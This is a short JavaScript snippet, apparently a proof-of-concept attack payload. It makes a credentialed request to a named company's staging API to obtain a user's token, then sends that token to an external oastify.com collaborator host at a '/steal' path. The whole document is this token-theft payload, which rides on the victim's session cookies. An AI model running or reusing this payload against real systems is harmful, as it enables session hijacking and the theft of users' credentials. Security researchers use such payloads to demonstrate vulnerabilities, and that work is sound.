fetch("https://api-stage.suralink.com/v1.1/apps/873/8141/token", {
    credentials: "include" // Includes cookies if they are required for authentication
})
.then(response => response.json())
.then(data => {
    fetch("https://fj20b3rqho5l2tnow8dnjhktuk0bogc5.oastify.com/steal?key=" + encodeURIComponent(data.token));
});